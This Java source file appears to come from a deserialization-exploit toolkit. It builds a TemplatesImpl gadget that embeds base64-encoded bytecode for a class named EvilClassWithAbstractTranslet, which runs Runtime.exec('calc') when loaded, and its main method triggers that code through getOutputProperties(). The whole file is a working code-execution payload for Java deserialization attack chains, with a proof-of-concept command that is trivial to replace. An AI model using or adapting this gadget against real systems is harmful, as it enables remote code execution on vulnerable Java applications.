package org.example.gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.springframework.aop.framework.AdvisedSupport;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.Base64;
import javax.xml.transform.Templates;
import java.lang.reflect.*;
import static org.example.CommonUtils.*;

public class TemplateImplWithAbstractTranslet {
    public static TemplatesImpl getPayload(byte[] bytecode) throws Exception {
        if(bytecode == null)
            bytecode = Base64.getDecoder().decode("yv66vgAAADQAMAoACQAYCgAZABoIABsKABkAHAcAHQkAHgAfCgAgACEHACIHACMBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAJAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYBAA1TdGFja01hcFRhYmxlBwAiBwAdAQAKU291cmNlRmlsZQEAIkV2aWxDbGFzc1dpdGhBYnN0cmFjdFRyYW5zbGV0LmphdmEMABEAEgcAJQwAJgAnAQAEY2FsYwwAKAApAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAKgwAKwAsBwAtDAAuAC8BADBvcmcvZXhhbXBsZS9nYWRnZXQvRXZpbENsYXNzV2l0aEFic3RyYWN0VHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgAhAAgACQAAAAAAAwABAAoACwACAAwAAAAZAAAAAwAAAAGxAAAAAQANAAAABgABAAAADQAOAAAABAABAA8AAQAKABAAAgAMAAAAGQAAAAQAAAABsQAAAAEADQAAAAYAAQAAABIADgAAAAQAAQAPAAEAEQASAAEADAAAAGMAAgACAAAAGSq3AAG4AAISA7YABFenAAtMsgAGK7YAB7EAAQAEAA0AEAAFAAIADQAAABoABgAAABQABAAWAA0AGQAQABcAEQAYABgAGgATAAAAEAAC/wAQAAEHABQAAQcAFQcAAQAWAAAAAgAX");
        TemplatesImpl tpl = new TemplatesImpl();
        setFieldValue(tpl, "_name", "Strlng");
        setFieldValue(tpl, "_bytecodes", new byte[][]{bytecode});
        setFieldValue(tpl, "_tfactory", new TransformerFactoryImpl());
        return tpl;
    }

    public static void main(String[] argv) throws Exception {
        TemplateImplWithAbstractTranslet.getPayload(null).getOutputProperties();
    }
}
